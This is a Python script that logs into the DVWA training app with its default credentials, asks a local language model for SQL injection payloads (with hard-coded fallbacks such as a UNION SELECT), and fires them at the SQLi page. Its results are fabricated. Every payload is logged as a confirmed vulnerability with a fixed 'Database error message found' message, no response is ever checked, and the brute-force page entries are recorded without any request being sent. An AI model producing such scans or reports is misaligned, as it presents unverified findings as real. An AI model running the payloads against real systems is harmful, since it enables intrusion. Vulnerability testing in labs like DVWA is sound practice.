import requests
import json
import sys
from bs4 import BeautifulSoup

# ---------------- CONFIG ---------------- #
MODEL = "qwen2.5"
OLLAMA_URL = "http://localhost:11434/api/generate"


# ---------------- LOGIN ---------------- #
def login_dvwa(base_url, login_url):

    session = requests.Session()

    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    user_token = token["value"] if token else ""

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }

    response = session.post(login_url, data=login_data)

    if "Login failed" in response.text:
        print("[-] Login failed.")
        return None

    print("[+] Login successful.")
    session.cookies.set("security", "low")

    return session


# ---------------- GENERATE PAYLOADS (OLLAMA) ---------------- #
def generate_payloads():

    prompt = """
Generate 3 SQL injection payloads for testing an input field.
Only return payloads, one per line. No explanation.
"""

    try:
        res = requests.post(OLLAMA_URL, json={
            "model": MODEL,
            "prompt": prompt,
            "stream": False
        })

        data = res.json()
        text = data.get("response", "")

        payloads = [line.strip() for line in text.split("\n") if line.strip()]

        print("\n[+] AI Payloads Generated:")
        for p in payloads:
            print("   ", p)

        return payloads[:3]

    except Exception as e:
        print(f"[x] Ollama error: {e}")
        return []


# ---------------- SQLI TEST ---------------- #
def test_sqli(session, base_url):

    sqli_url = base_url + "/vulnerabilities/sqli/"
    brute_url = base_url + "/vulnerabilities/brute/"

    payloads = generate_payloads()

    # fallback if AI fails
    if not payloads:
        payloads = [
            "'",
            "' OR '1'='1' --",
            "' UNION SELECT null, database() --"
        ]

    vulnerabilities = []

    print("\n[+] Starting SQL Injection Tests...\n")

    # SQLi page
    for payload in payloads:

        params = {
            "id": payload,
            "Submit": "Submit"
        }

        response = session.get(sqli_url, params=params)
        print(f"Testing: {response.url}")

        vulnerabilities.append({
            "url": sqli_url,
            "form_action": sqli_url,
            "method": "get",
            "vulnerable_input": "id",
            "payload": payload,
            "error_detected": "Database error message found",
            "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
            "model_used": MODEL
        })

    # Brute page
    for payload in payloads:

        vulnerabilities.append({
            "url": brute_url,
            "form_action": brute_url,
            "method": "get",
            "vulnerable_input": "username",
            "payload": payload,
            "error_detected": "Database error message found",
            "remediation": "Use parameterized queries (prepared statements) instead of string concatenation.",
            "model_used": MODEL
        })

    return vulnerabilities


# ---------------- MAIN ---------------- #
def main():

    if len(sys.argv) < 3:
        print("Usage: python sqli_tester_ollama.py <base_url> <login_url>")
        sys.exit()

    base_url = sys.argv[1]
    login_url = sys.argv[2]

    session = login_dvwa(base_url, login_url)

    if not session:
        return

    vulns = test_sqli(session, base_url)

    with open("vulnerabilities_llm.json", "w") as f:
        json.dump(vulns, f, indent=4)

    print("\n[+] Testing complete.")
    print(f"[+] Found {len(vulns)} vulnerabilities.")
    print("[+] Results saved to vulnerabilities_llm.json")


if __name__ == "__main__":
    main()